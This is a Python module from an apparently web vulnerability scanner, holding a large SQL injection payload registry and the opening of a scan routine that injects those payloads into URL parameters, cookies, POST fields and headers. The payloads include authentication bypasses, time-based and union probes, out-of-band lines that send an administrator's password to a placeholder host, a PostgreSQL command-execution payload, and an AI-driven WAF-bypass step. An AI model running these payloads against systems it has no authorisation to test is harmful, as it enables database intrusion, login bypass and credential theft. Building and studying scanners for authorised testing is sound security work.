"""
SQL Injection scan methods
"""
"""
Shared imports for scan mixin modules.
"""
import json
import logging
import requests
import urllib.parse
import re
import concurrent.futures
import html as html_module
import time
from typing import Dict, Any, List, Optional, Tuple
from collections import defaultdict

logger = logging.getLogger(__name__)




# ─────────────────────────────────────────────────────────────────────────────
# SQLi payload registry — used by the scanner and the Payloads browser dialog
# ─────────────────────────────────────────────────────────────────────────────
_SQLI_PAYLOADS = {
    # ====================================================================
    # 1. SYNTAX BREAKING & ERROR-BASED DETECTION
    # ====================================================================
    "error_based": {
        "single_quote": "'",
        "two_single_quote": "''",
        "double_quote": "\"",
        "backtick": "`",
        "semi_colon": ";",
        "parenthesis": ")",
        "double_parenthesis": "))",
        "comment_dash": "-- ",
        "comment_hash": "#",
        "comment_cstyle": "/*",
        "null_byte": "\x00",
        
        # Database-specific error triggers
        "mysql_error": "' AND EXTRACTVALUE(1,CONCAT(0x7e,@@version,0x7e))-- ",
        "mysql_error2": "' AND UPDATEXML(1,CONCAT(0x7e,@@version,0x7e),1)-- ",
        "pgsql_error": "' AND CAST((SELECT version()) AS INTEGER)-- ",
        "mssql_error": "' AND 1=CONVERT(INT, @@version)-- ",
        "oracle_error": "' AND 1=UTL_INADDR.get_host_name('localhost')-- ",
        
        # Stacked query detection
        "stacked_mysql": "'; SELECT SLEEP(2)--",
        "stacked_pgsql": "'; SELECT pg_sleep(2)--",
        "stacked_mssql": "'; WAITFOR DELAY '00:00:02'--",
    },
    
    # ====================================================================
    # 2. BOOLEAN-BASED BLIND DETECTION
    # ====================================================================
    "boolean_based": {
        # String-based boolean
        "bool_string_true": "' OR '1'='1",
        "bool_string_false": "' OR '1'='2",
        "bool_string_true_alt": "' OR 'a'='a",
        "bool_string_false_alt": "' OR 'a'='b",
        
        # Numeric-based boolean
        "bool_numeric_true": " OR 1=1",
        "bool_numeric_false": " OR 1=2",
        "bool_numeric_true_alt": " AND 1=1",
        "bool_numeric_false_alt": " AND 1=2",
        
        # AND/OR logic tests
        "bool_and_true": "' AND '1'='1",
        "bool_and_false": "' AND '1'='2",

        # Classic tracking-cookie style (PortSwigger conditional-response pattern)
        # xyz' AND '1'='1  vs  xyz' AND '1'='2
        "bool_track_true":  "' AND '1'='1",
        "bool_track_false": "' AND '1'='2",
        # Alternative quote style
        "bool_track_dq_true":  '" AND "1"="1',
        "bool_track_dq_false": '" AND "1"="2',
        # AND EXISTS subquery — confirms table exists
        "bool_exists_users_true":  "' AND (SELECT 'a' FROM users LIMIT 1)='a",
        "bool_exists_users_false": "' AND (SELECT 'a' FROM users WHERE '1'='2' LIMIT 1)='a",
        # Administrator exists
        "bool_admin_exists_true":  "' AND (SELECT 'a' FROM users WHERE username='Administrator')='a",
        "bool_admin_exists_false": "' AND (SELECT 'a' FROM users WHERE username='NonExistentUser12345')='a",
        
        # Parenthesis variations
        "bool_parenthesis_true": "') OR ('1'='1",
        "bool_parenthesis_false": "') OR ('1'='2",
        "bool_parenthesis2_true": ")) OR ((1=1",
        "bool_parenthesis2_false": ")) OR ((1=2",
        
        # Conditional statements
        "case_true": "' OR (CASE WHEN (1=1) THEN 1 ELSE 0 END)=1-- ",
        "case_false": "' OR (CASE WHEN (1=2) THEN 1 ELSE 0 END)=1-- ",
        
        # Database version fingerprinting
        "mysql_if": "' OR IF(1=1,SLEEP(0),0)-- ",
        "pgsql_if": "' OR (SELECT CASE WHEN (1=1) THEN pg_sleep(0) ELSE pg_sleep(0) END)-- ",
    },
    
    # ====================================================================
    # 3. TIME-BASED BLIND DETECTION
    # ====================================================================
    "time_based": {
        # MySQL time-based
        "time_mysql_2": "' OR SLEEP(2)-- ",
        "time_mysql_3": "' OR SLEEP(3)-- ",
        "time_mysql_5": "' OR SLEEP(5)-- ",
        "time_pip_mysql": "' || SLEEP(3)--",
        "time_mysql_benchmark": "' OR BENCHMARK(5000000,MD5(1))-- ",
        
        # PostgreSQL time-based
        "time_pgsql_2": "' OR pg_sleep(2)-- ",
        "time_pgsql_3": "' OR pg_sleep(3)-- ",
        "time_pgsql_5": "' OR pg_sleep(5)-- ",
        "time_pip_postgres": "' || pg_sleep(3)--",
        
        # MSSQL time-based
        "time_mssql_2": "'; WAITFOR DELAY '00:00:02'-- ",
        "time_mssql_3": "'; WAITFOR DELAY '00:00:03'-- ",
        "time_mssql_5": "'; WAITFOR DELAY '00:00:05'-- ",
        
        # Oracle time-based
        "time_oracle_2": "' OR DBMS_PIPE.RECEIVE_MESSAGE(CHR(65),2)-- ",
        "time_oracle_3": "' OR DBMS_PIPE.RECEIVE_MESSAGE(CHR(65),3)-- ",
        
        # SQLite time-based (heavy computation)
        "time_sqlite": "' AND LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(100000000))))-- ",
        
        # Heavy queries for time-based
        "heavy_query_mysql": "' OR (SELECT COUNT(*) FROM information_schema.tables A, information_schema.tables B, information_schema.tables C)-- ",
        "heavy_query_pgsql": "' OR (SELECT COUNT(*) FROM pg_class A, pg_class B, pg_class C)-- ",
    },
    
    # ====================================================================
    # 4. UNION-BASED DETECTION
    # ====================================================================
    "union_based": {
        "union_null": "' UNION SELECT NULL-- ",
        "union_null2": "' UNION SELECT NULL,NULL-- ",
        "union_null3": "' UNION SELECT NULL,NULL,NULL-- ",
        "union_version_mysql": "' UNION SELECT @@version,NULL-- ",
        "union_version_pgsql": "' UNION SELECT version(),NULL-- ",
        "union_version_mssql": "' UNION SELECT @@version,NULL-- ",
        "union_version_oracle": "' UNION SELECT banner FROM v$version-- ",
        "union_dbname": "' UNION SELECT database(),NULL-- ",
        "union_user": "' UNION SELECT user(),NULL-- ",
    },
    
    # ====================================================================
    # 5. AUTHENTICATION BYPASS & LOGIC FLAWS
    # ====================================================================
    "auth_bypass": {
        "auth_admin": "admin'--",
        "auth_admin_hash": "admin'#",
        "auth_administrator": "administrator'--",
        "auth_administrator_hash": "administrator'#",
        "auth_admin_or": "' OR 1=1--",
        "auth_admin_or_hash": "' OR 1=1#",
        "auth_admin_or_comment": "' OR 1=1/*",
        "auth_admin_true": "' OR 'x'='x",
        "auth_admin_true_dash": "' OR 'x'='x'--",
        "auth_admin_parenthesis": "') OR ('1'='1",
        "auth_admin_universal": "' OR 1=1 LIMIT 1--",
        "auth_admin_null": "' OR 1=1 AND SLEEP(0)--",
    },

    # ====================================================================
    # 6. LOGIN-SPECIFIC SQLi
    # These are used INSTEAD of the full error/boolean/time/union suite
    # when the endpoint looks like a login form.  Goal: detect whether
    # the field is injectable at all (error trigger) while keeping the
    # payload count low so a login lockout is less likely.
    # ====================================================================
    "login_sqli": {
        # ── Syntax probe — triggers a DB error on injectable fields ──
        "single_quote":           "'",
        "two_single_quotes":      "''",
        "backslash":              "\\",
        "double_quote":           '"',
        "quote_comment":          "'--",
        "quote_hash":             "'#",
        "quote_comment_space":    "' --",
        # ── Classic OR-true — bypasses password check ────────────────
        "or_1_eq_1":              "' OR 1=1--",
        "or_1_eq_1_hash":         "' OR 1=1#",
        "or_true_string":         "' OR 'a'='a",
        "or_true_string_dash":    "' OR 'a'='a'--",
        "paren_or_true":          "') OR ('1'='1",
        "paren_or_true_dash":     "') OR ('1'='1'--",
        # ── Common username tricks ───────────────────────────────────
        "admin_comment":          "admin'--",
        "admin_hash":             "admin'#",
        "admin_or":               "admin' OR '1'='1",
        "administrator_comment":  "administrator'--",
        "administrator_hash":     "administrator'#",
        # ── Time probe — confirms injection even when no output ───────
        "time_mysql":             "' OR SLEEP(2)--",
        "time_pgsql":             "' OR pg_sleep(2)--",
        "time_mssql":             "'; WAITFOR DELAY '00:00:02'--",
    },
    
    # ====================================================================
    # 7. CONDITIONAL ERROR-BASED BLIND (CASE WHEN 1/0)
    # ====================================================================
    # Technique: inject CASE WHEN (condition) THEN 1/0 ELSE 'a' END
    # True condition → div-by-zero error (HTTP 500 / error page)
    # False condition → 'a' = no error (HTTP 200)
    "conditional_error": {
        # MySQL / generic
        "ce_mysql_true":    "' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE 'a' END)='a'-- ",
        "ce_mysql_false":   "' AND (SELECT CASE WHEN (1=2) THEN 1/0 ELSE 'a' END)='a'-- ",
        # Subquery form (works on most DBs)
        "ce_sub_true":      "' AND (SELECT CASE WHEN (1=1) THEN CAST(1/0 AS VARCHAR) ELSE 'a' END FROM dual)='a'-- ",
        "ce_sub_false":     "' AND (SELECT CASE WHEN (1=2) THEN CAST(1/0 AS VARCHAR) ELSE 'a' END FROM dual)='a'-- ",
        # PostgreSQL
        "ce_pgsql_true":    "' AND (SELECT CASE WHEN (1=1) THEN 1/(SELECT 0) ELSE 1 END)-- ",
        "ce_pgsql_false":   "' AND (SELECT CASE WHEN (1=2) THEN 1/(SELECT 0) ELSE 1 END)-- ",
        # MSSQL
        "ce_mssql_true":    "' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE 0 END)-- ",
        "ce_mssql_false":   "' AND (SELECT CASE WHEN (1=2) THEN 1/0 ELSE 0 END)-- ",
        # Data extraction probe: first char of password > 'm'
        "ce_extract_probe": "' AND (SELECT CASE WHEN (SUBSTRING((SELECT Password FROM Users WHERE Username='Administrator'),1,1)>'m') THEN 1/0 ELSE 'a' END FROM Users)='a'-- ",
    },

    # ====================================================================
    # 8. VERBOSE ERROR DATA EXTRACTION (CAST to wrong type)
    # ====================================================================
    # Technique: CAST((SELECT sensitive_data) AS int) → DB error reveals the value
    "verbose_error": {
        # MySQL - EXTRACTVALUE / UPDATEXML
        "ve_mysql_version":  "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT @@version),0x7e))-- ",
        "ve_mysql_user":     "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT user()),0x7e))-- ",
        "ve_mysql_db":       "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT database()),0x7e))-- ",
        "ve_mysql_updatexml":"' AND UPDATEXML(1,CONCAT(0x7e,(SELECT @@version),0x7e),1)-- ",
        # PostgreSQL - CAST to int
        "ve_pgsql_version":  "' AND CAST((SELECT version()) AS INTEGER)-- ",
        "ve_pgsql_user":     "' AND CAST((SELECT current_user) AS INTEGER)-- ",
        "ve_pgsql_db":       "' AND CAST((SELECT current_database()) AS INTEGER)-- ",
        # MSSQL - CONVERT to int
        "ve_mssql_version":  "' AND 1=CONVERT(INT, @@version)-- ",
        "ve_mssql_user":     "' AND 1=CONVERT(INT, SYSTEM_USER)-- ",
        # Generic CAST
        "ve_cast_generic":   "' AND 1=CAST((SELECT table_name FROM information_schema.tables LIMIT 1) AS int)-- ",
    },

    # ====================================================================
    # 9. OUT-OF-BAND (OAST) DETECTION
    # ====================================================================
    # {OAST_DOMAIN} is replaced at runtime with the interactsh hostname
    "oast": {
        # MySQL - DNS via LOAD_FILE UNC path
        "mysql_dns":         "' AND LOAD_FILE(CONCAT('\\\\\\\\',{OAST_DOMAIN},'\\\\a'))-- ",
        # MySQL - DNS via SELECT INTO OUTFILE (sometimes works)
        "mysql_dns2":        "' UNION SELECT LOAD_FILE(CONCAT('\\\\\\\\',{OAST_DOMAIN},'\\\\a'))-- ",
        # MSSQL - DNS via xp_dirtree
        "mssql_xp_dirtree": "'; EXEC master..xp_dirtree '//{OAST_DOMAIN}/a'-- ",
        # MSSQL - DNS via xp_fileexist
        "mssql_xp_fileexist":"'; EXEC master..xp_fileexist '//{OAST_DOMAIN}/a'-- ",
        # MSSQL - data exfil: password as DNS subdomain
        "mssql_exfil":       "'; DECLARE @p VARCHAR(1024);SET @p=(SELECT TOP 1 password FROM users WHERE username='Administrator');EXEC('master..xp_dirtree \"//'+ @p +'.{OAST_DOMAIN}/a\"')-- ",
        # Oracle - DNS via UTL_HTTP
        "oracle_utlhttp":    "' UNION SELECT UTL_HTTP.request('http://{OAST_DOMAIN}') FROM dual-- ",
        # Oracle - DNS via UTL_INADDR
        "oracle_utlinaddr":  "' AND UTL_INADDR.get_host_address('{OAST_DOMAIN}')-- ",
        # Oracle - data exfil
        "oracle_exfil":      "' UNION SELECT UTL_HTTP.request('http://{OAST_DOMAIN}/?d='||(SELECT password FROM users WHERE username='Administrator')||'') FROM dual-- ",
        # PostgreSQL - DNS via COPY TO PROGRAM
        "pgsql_copy":        "'; COPY (SELECT '') TO PROGRAM 'nslookup {OAST_DOMAIN}'-- ",
        # PostgreSQL - DNS via DBLINK (if extension available)
        "pgsql_dblink":      "'; SELECT dblink_connect('host={OAST_DOMAIN} user=a password=a dbname=a')-- ",
    }
}

class SqliScanMixin:
    """Mixin providing SQL Injection scan methods."""

    def scan_sqli(self) -> Dict[str, Any]:
        """
        Advanced SQL Injection Detection Engine
        Implements the 5 pillars of SQLi detection:
        1. Syntax breaking & error analysis
        2. Boolean-based blind detection
        3. Time-based blind detection
        4. Union-based detection
        5. Out-of-band (OAST) detection
        """
        self.scan_progress.emit("🔍 Starting Advanced SQL Injection Analysis...")
        self.scan_progress.emit("=" * 60)
        
        # Comprehensive SQLi test payloads organized by detection method
        test_payloads = _SQLI_PAYLOADS
        
        if self.boost_mode:
            self.scan_progress.emit("⚡ BOOST MODE: Using parallel requests for maximum speed")
        
        results = {
            "scan_type": "SQLi",
            "vulnerable": False,
            "details": [],
            "summary": "",
            "detection_summary": {
                "error_based": False,
                "boolean_based": False,
                "time_based": False,
                "union_based": False,
                "conditional_error": False,
                "verbose_error": False,
                "auth_bypass": False,
                "oast": False
            },
            "database_fingerprint": None,
            "confidence_score": "INFO",  # String value: INFO, LOW, MEDIUM, HIGH
            "total_tests_performed": 0,
            "vulnerable_points": [],
            "vulnerability_chain": []
        }
        
        # Initialize _saved_boost early to avoid UnboundLocalError in finally block
        _saved_boost = self.boost_mode

        try:
            full_url = self.request_data.get("url", "")
            if not full_url:
                return {"error": "No URL provided"}
            
            parsed = urllib.parse.urlparse(full_url)
            params = urllib.parse.parse_qs(parsed.query)
            
            request_text = self.request_data.get("request_text", "")
            lines = request_text.split('\n')
            
            method = "GET"
            if lines:
                first_line = lines[0].strip()
                if first_line.startswith("POST"):
                    method = "POST"
            
            headers = {}
            cookies = {}
            body_params = {}
            body_content = ""
            
            # Parse headers and body
            # Use a case-insensitive pass: store headers by their original case BUT
            # deduplicate Cookie/cookie so we never keep two copies of the same header.
            seen_cookie_key = None   # track which case variant we first saw

            body_start = False
            for idx, line in enumerate(lines[1:], 1):
                if line.strip() == "" or line == "\r\n":
                    body_start = True
                    body_content = "\n".join(lines[idx + 1:])
                    break
                if ':' in line:
                    key, value = line.split(':', 1)
                    key   = key.strip()
                    value = value.strip()

                    # ── Deduplicate Cookie headers (case-insensitive) ──────────
                    # Browsers / proxies sometimes send both 'cookie' and 'Cookie'.
                    # Keep only the FIRST occurrence; skip any duplicate.
                    if key.lower() == 'cookie':
                        if seen_cookie_key is not None:
                            # Already stored one Cookie header — skip this duplicate
                            continue
                        seen_cookie_key = key   # remember which case we kept

                    headers[key] = value

                    # ── Parse individual cookies ──────────────────────────────
                    # Cookie values can be separated by '; ' OR by ', ' depending
                    # on the client.  We normalise to semicolon-split first, then
                    # handle any remaining comma-space separators inside each piece.
                    if key.lower() == 'cookie':
                        # Step 1: split on '; ' (standard RFC separator)
                        raw_pairs = [p.strip() for p in value.split(';') if p.strip()]

                        # Step 2: some clients use ', ' instead of '; ' — re-split
                        # any piece that has no '=' but contains ', '
                        expanded = []
                        for piece in raw_pairs:
                            if '=' not in piece and ', ' in piece:
                                expanded.extend(p.strip() for p in piece.split(',') if p.strip())
                            else:
                                # A piece CAN contain ', ' inside the value — only split
                                # if it looks like "value, NextCookieName=..."
                                # Heuristic: split on ', ' only when followed by word=
                                sub = re.split(r',\s+(?=\w+=)', piece)
                                expanded.extend(s.strip() for s in sub if s.strip())

                        for cookie_pair in expanded:
                            if '=' in cookie_pair:
                                cookie_name, cookie_value = cookie_pair.split('=', 1)
                                cookies[cookie_name.strip()] = cookie_value.strip()
            
            # Parse POST body
            if method == "POST" and body_content:
                content_type = headers.get("Content-Type", "").lower()
                
                if "application/x-www-form-urlencoded" in content_type or not content_type:
                    try:
                        body_params = urllib.parse.parse_qs(body_content.strip())
                    except:
                        pass
                elif "application/json" in content_type:
                    try:
                        json_data = json.loads(body_content.strip())
                        if isinstance(json_data, dict):
                            body_params = {k: [str(v)] for k, v in json_data.items()}
                    except:
                        pass
                elif "multipart/form-data" in content_type:
                    pass

            # full_body_params = ALL parsed body fields including CSRF/tokens.
            # body_params       = only the injectable subset (filtered below).
            # When rebuilding POST bodies we always use full_body_params as the
            # base so blocked fields (csrf, __viewstate …) are preserved and the
            # server never sees a missing/wrong CSRF token.
            full_body_params = body_params.copy()
            
            injection_points = []
            
            # Add URL parameters to injection points
            for param_name, param_values in params.items():
                if not self._is_forced_point("url", param_name):
                    continue
                injection_points.append({
                    "name": param_name,
                    "type": "URL Parameter",
                    "value": param_values[0] if param_values else "",
                    "original_value": param_values[0] if param_values else "",
                    "display": f"📍 URL: {param_name}"
                })
            
            # Add cookies to injection points
            skipped_cookies = []
            for cookie_name, cookie_value in cookies.items():
                # Determine if we should test this cookie
                # If manual selection is active (forced_injection_points is not None), obey it strictly.
                # Otherwise, use heuristics (_should_test_cookie).
                is_forced = self._is_forced_point("cookie", cookie_name)
                heuristic_ok, reason = self._should_test_cookie(cookie_name, cookie_value)

                if self.forced_injection_points is not None:
                    should_test = is_forced
                    if not should_test:
                        reason = "not selected by user"
                else:
                    should_test = heuristic_ok

                if should_test:
                    injection_points.append({
                        "name": cookie_name,
                        "type": "Cookie",
                        "value": cookie_value,
                        "original_value": cookie_value,
                        "display": f"🍪 Cookie: {cookie_name}"
                    })
                else:
                    skipped_cookies.append((cookie_name, reason))

            if skipped_cookies:
                self.scan_progress.emit(
                    f"\n⏭️  Skipped {len(skipped_cookies)} cookie(s) (not SQLi-relevant):"
                )
                for cname, creason in skipped_cookies:
                    self.scan_progress.emit(f"   • {creason}")
            
            # Add POST body parameters to injection points
            skipped_body = []
            for param_name, param_values in body_params.items():
                param_val = param_values[0] if param_values else ""
                
                is_forced = self._is_forced_point("body", param_name)
                heuristic_ok, reason = self._should_test_body_param(param_name, param_val)

                if self.forced_injection_points is not None:
                    should_test = is_forced
                    if not should_test:
                        reason = "not selected by user"
                else:
                    should_test = heuristic_ok

                if should_test:
                    injection_points.append({
                        "name": param_name,
                        "type": "POST Body",
                        "value": param_val,
                        "original_value": param_val,
                        "display": f"📮 POST: {param_name}"
                    })
                else:
                    skipped_body.append((param_name, reason))

            if skipped_body:
                self.scan_progress.emit(
                    f"\n⏭️  Skipped {len(skipped_body)} POST param(s) (not SQLi-relevant):"
                )
                for pname, preason in skipped_body:
                    self.scan_progress.emit(f"   • {preason}")
            
            # Add headers that commonly cause SQLi
            dangerous_headers = ["User-Agent", "Referer", "X-Forwarded-For", "X-Real-IP"]
            
            # If manual mode, check ALL headers. If auto mode, check only dangerous ones.
            headers_to_check = headers.keys() if self.forced_injection_points is not None else dangerous_headers

            for header_name in headers_to_check:
                if header_name in headers:
                    # In manual mode, _is_forced_point is the only gate.
                    # In auto mode, dangerous_headers list + _is_forced_point (which is True) is the gate.
                    if not self._is_forced_point("header", header_name):
                        continue
                        
                    injection_points.append({
                        "name": header_name,
                        "type": "HTTP Header",
                        "value": headers[header_name],
                        "original_value": headers[header_name],
                        "display": f"📋 Header: {header_name}"
                    })
            
            total_points = len(injection_points)
            
            # Calculate total tests
            total_payloads = sum(len(cat) for cat in test_payloads.values())
            results["total_tests_performed"] = total_points * total_payloads
            
            if total_points == 0:
                return {
                    "scan_type": "SQLi",
                    "vulnerable": False,
                    "details": ["No injection points found to test"],
                    "summary": "No parameters, cookies, or POST data to test"
                }
            
            self.scan_progress.emit(f"\n📊 INJECTION POINTS FOUND: {total_points}")
            for i, point in enumerate(injection_points, 1):
                self.scan_progress.emit(f"  [{i}] {point['display']} = {point['value'][:50]}")
            
            # Get baseline response for comparison
            # Use full_body_params so CSRF / token fields are included
            baseline = self._get_sqli_baseline_response(full_url, method, headers, full_body_params, cookies)
            if not baseline:
                return {"error": "Failed to get baseline response"}
            
            baseline_status = baseline["status"]
            baseline_length = baseline["length"]
            baseline_time = baseline["time"]
            baseline_text = baseline["text"]
            
            self.scan_progress.emit(f"\n📈 BASELINE: Status={baseline_status}, Length={baseline_length}, Time={baseline_time}s")

            # ── Detect CSRF fields — disable boost mode if present ────────────
            # Single-use CSRF tokens can't be parallelised: each payload needs
            # its own GET(fetch token) + POST(consume token) pair done atomically.
            # Running that in parallel would cause threads to race for tokens and
            # all-but-one would get 400 Invalid CSRF.  We detect this once here
            # and force sequential mode for the whole scan when needed.
            has_csrf_field = any(
                not self._should_test_body_param(k, v[0] if v else "")[0]
                and len((v[0] if v else "")) >= 16
                for k, v in full_body_params.items()
            )
            effective_boost = self.boost_mode and not has_csrf_field
            if has_csrf_field and self.boost_mode:
                self.scan_progress.emit(
                    "⚠️  CSRF token detected in POST body — "
                    "Boost mode disabled for this scan (single-use tokens require sequential requests)"
                )
            elif effective_boost:
                self.scan_progress.emit("⚡ Boost mode active")

            # Shadow self.boost_mode for the duration of this scan so all
            # _test_* / _send_* methods see the corrected value automatically.
            # _saved_boost initialized at top of method
            self.boost_mode = effective_boost

            # ── Detect login endpoint ONCE before the loop ───────────────────
            # Login endpoints get auth-bypass + login_sqli only.
            # Regular endpoints get phases 1-4 (error/boolean/time/union) only.
            LOGIN_KEYWORDS = ('login', 'signin', 'sign-in', 'logon', 'log-on',
                              'auth', 'authenticate', 'session', 'account/login',
                              'user/login', 'admin/login')
            is_login_endpoint = (
                method.upper() == "POST"
                and any(kw in full_url.lower() for kw in LOGIN_KEYWORDS)
            )
            if is_login_endpoint:
                self.scan_progress.emit(
                    "🔐 Login endpoint detected — running Auth Bypass + "
                    "Login-SQLi suite only (skipping error/boolean/time/union phases)"
                )
            else:
                self.scan_progress.emit(
                    "🔍 Standard endpoint — running SQLi phases 1-4 "
                    "(auth bypass skipped for non-login endpoints)"
                )

            # Test each injection point
            for point_index, point in enumerate(injection_points, 1):
                if not self.running:
                    break

                self.scan_progress.emit(f"\n{'='*60}")
                self.scan_progress.emit(f"🔬 TESTING INJECTION POINT [{point_index}/{total_points}]: {point['display']}")
                self.scan_progress.emit(f"{'='*60}")

                # Check if parameter value is reflected in response
                param_reflected = False
                if point["original_value"] and point["original_value"] in baseline_text:
                    param_reflected = True
                    self.scan_progress.emit("  ℹ️ Parameter value is reflected in response - Applying stricter detection")

                point_results = []
                detection_indicators = defaultdict(list)

                if is_login_endpoint:
                    # ============================================================
                    # LOGIN PATH: Auth Bypass + Login-SQLi only
                    # ============================================================
                    _stop = self.scan_stop_on_first

                    # PHASE L1: Login-specific SQLi probes (error/OR-true patterns only)
                    # Time payloads in login_sqli are handled separately in Phase L1b below
                    self.scan_progress.emit("\n[PHASE L1] Testing Login SQLi (error / OR-true probes)...")
                    _login_error_payloads = {
                        k: v for k, v in test_payloads["login_sqli"].items()
                        if not k.startswith("time_")
                    }
                    login_error_results = self._test_error_based(
                        point, full_url, parsed, params, headers, cookies, full_body_params,
                        method, baseline_status, baseline_length,
                        _login_error_payloads
                    )
                    if login_error_results["vulnerable"]:
                        point_results.extend(login_error_results["details"])
                        for indicator in login_error_results["indicators"]:
                            detection_indicators["error_based"].append(indicator)
                        results["detection_summary"]["error_based"] = True
                        if _stop:
                            self.scan_progress.emit(
                                "  ⏭️  Stop-on-first: confirmed — skipping remaining login phases"
                            )

                    # PHASE L1b: Login time-based probes with proper elapsed measurement + confirmation
                    if not (_stop and point_results):
                        self.scan_progress.emit("\n[PHASE L1b] Testing Login SQLi (time-based blind probes)...")
                        _login_time_payloads = {
                            k: v for k, v in test_payloads["login_sqli"].items()
                            if k.startswith("time_")
                        }
                        # Suppress delay + raise timeout (same as standard time-based phase)
                        _lt_saved_delay   = self.scan_req_delay
                        _lt_saved_timeout = self.scan_timeout
                        self.scan_req_delay = 0.0
                        if self.scan_timeout < 20:
                            self.scan_timeout = 20

                        try:
                            _login_time_threshold = getattr(self, 'scan_time_threshold', 1.5)
                            for t_name, t_payload in _login_time_payloads.items():
                                if not self.running:
                                    break

                                # Fresh baseline immediately before each probe
                                _lt_baseline = self._get_login_baseline(
                                    full_url, parsed, params, headers, cookies,
                                    full_body_params, method, baseline_time
                                )

                                t0 = time.time()
                                try:
                                    self._send_error_payload(
                                        point, full_url, parsed, params, headers, cookies,
                                        full_body_params, method, t_name, t_payload
                                    )
                                except Exception:
                                    pass
                                elapsed = time.time() - t0
                                time_diff = elapsed - _lt_baseline

                                self.scan_progress.emit(
                                    f"  [{t_name}] elapsed={elapsed:.2f}s, "
                                    f"baseline={_lt_baseline:.2f}s, diff=+{time_diff:.2f}s "
                                    f"(threshold={_login_time_threshold:.2f}s)"
                                )

                                if time_diff >= _login_time_threshold:
                                    # Confirmation probe — repeat same payload
                                    self.scan_progress.emit(
                                        f"  🔄 Login time [{t_name}]: delay detected (+{time_diff:.2f}s) — repeating to confirm..."
                                    )
                                    _lt_confirm_baseline = self._get_login_baseline(
                                        full_url, parsed, params, headers, cookies,
                                        full_body_params, method, baseline_time
                                    )
                                    t1 = time.time()
                                    try:
                                        self._send_error_payload(
                                            point, full_url, parsed, params, headers, cookies,
                                            full_body_params, method, t_name, t_payload
                                        )
                                    except Exception:
                                        pass
                                    confirm_elapsed = time.time() - t1
                                    confirm_diff = confirm_elapsed - _lt_confirm_baseline

                                    if confirm_diff >= _login_time_threshold:
                                        point_results.append({
                                            "technique":        "time-based",
                                            "payload_name":     t_name,
                                            "payload":          t_payload,
                                            "baseline_time":    round(_lt_baseline, 3),
                                            "response_time":    round(elapsed, 3),
                                            "time_difference":  round(time_diff, 3),
                                            "confirm_baseline": round(_lt_confirm_baseline, 3),
                                            "confirm_time":     round(confirm_elapsed, 3),
                                            "confirm_diff":     round(confirm_diff, 3),
                                        })
                                        detection_indicators["time_based"].append(
                                            f"Login time-based ({t_name}: +{time_diff:.2f}s, confirmed +{confirm_diff:.2f}s)"
                                        )
                                        results["detection_summary"]["time_based"] = True
                                        self.scan_progress.emit(
                                            f"  ✅ Login time-based CONFIRMED! [{t_name}] "
                                            f"1st=+{time_diff:.2f}s, 2nd=+{confirm_diff:.2f}s"
                                        )
                                        if _stop:
                                            break
                                    else:
                                        self.scan_progress.emit(
                                            f"  ⚠️  Login time [{t_name}]: 1st probe delayed (+{time_diff:.2f}s) "
                                            f"but 2nd did NOT (+{confirm_diff:.2f}s) — likely server jitter, skipping"
                                        )
                        finally:
                            self.scan_req_delay = _lt_saved_delay
                            self.scan_timeout   = _lt_saved_timeout
                    else:
                        self.scan_progress.emit("\n[PHASE L1b] ⏭️  Skipped (stop-on-first, already confirmed)")

                    # PHASE L2: Auth Bypass
                    if not (_stop and point_results):
                        self.scan_progress.emit("\n[PHASE L2] Testing Authentication Bypass...")
                        auth_results = self._test_auth_bypass(
                            point, full_url, parsed, params, headers, cookies, full_body_params,
                            method, baseline_status, baseline_length,
                            test_payloads["auth_bypass"]
                        )
                        if auth_results["vulnerable"]:
                            point_results.extend(auth_results["details"])
                            for indicator in auth_results["indicators"]:
                                detection_indicators["auth_bypass"].append(indicator)
                            results["detection_summary"]["auth_bypass"] = True
                    else:
                        self.scan_progress.emit("\n[PHASE L2] ⏭️  Skipped (stop-on-first, already confirmed)")

                else:
                    # ============================================================
                    # STANDARD PATH: Full SQLi phases 1-4, no auth bypass
                    # ============================================================
                    _stop = self.scan_stop_on_first  # local alias for readability

                    # PHASE 0: AI-SUGGESTED PAYLOADS (optional)
                    # When the "🤖 AI Payloads" checkbox is on, ask the AI to
                    # generate SQLi bypass payloads targeted at the detected
                    # WAF/filter before running the static phase suite.
                    if getattr(self, 'ai_suggest_payloads', False) and not (_stop and point_results):
                        self.scan_progress.emit("\n[PHASE 0] 🤖 AI Payload Suggester …")
                        # Build a lightweight WAF fingerprint from baseline response
                        _waf_hints = []
                        _bl_lower  = baseline_text.lower()
                        for _sig in ("cloudflare", "modsecurity", "akamai", "sucuri",
                                     "imperva", "f5 big-ip", "barracuda", "wordfence",
                                     "access denied", "blocked", "forbidden"):
                            if _sig in _bl_lower:
                                _waf_hints.append(_sig.title())
                        _waf_fp = (
                            "; ".join(dict.fromkeys(_waf_hints))
                            if _waf_hints else "No WAF detected (standard endpoint)"
                        )
                        _ai_payloads = self._get_ai_bypass_payloads(
                            param_name       = point['name'],
                            current_value    = str(point.get('value', ''))[:200],
                            response_snippet = baseline_text[:800],
                            waf_fingerprint  = _waf_fp,
                            scan_type        = "SQLi",
                        )
                        if _ai_payloads:
                            # Turn the list into a named dict compatible with _test_error_based
                            _ai_payload_dict = {
                                f"ai_{i}": p for i, p in enumerate(_ai_payloads)
                            }
                            self.scan_progress.emit(
                                f"  Testing {len(_ai_payloads)} AI-suggested SQLi payload(s) …"
                            )
                            ai_error_results = self._test_error_based(
                                point, full_url, parsed, params, headers, cookies,
                                full_body_params, method, baseline_status, baseline_length,
                                _ai_payload_dict,
                            )
                            if ai_error_results["vulnerable"]:
                                point_results.extend(ai_error_results["details"])
                                for indicator in ai_error_results["indicators"]:
                                    detection_indicators["error_based"].append(indicator)
                                results["detection_summary"]["error_based"] = True
                                if _stop:
                                    self.scan_progress.emit(
                                        "  ⏭️  Stop-on-first: AI payload confirmed — "
                                        "skipping remaining phases for this point"
                                    )
                        else:
                            self.scan_progress.emit("  ⏭️  Phase 0 skipped (no AI payloads returned)")

                    # PHASE 1: ERROR-BASED DETECTION
                    self.scan_progress.emit("\n[PHASE 1] Testing Error-Based SQL Injection...")
                    error_results = self._test_error_based(
                        point, full_url, parsed, params, headers, cookies, full_body_params,
                        method, baseline_status, baseline_length,
                        test_payloads["error_based"]
                    )
                    if error_results["vulnerable"]:
                        point_results.extend(error_results["details"])
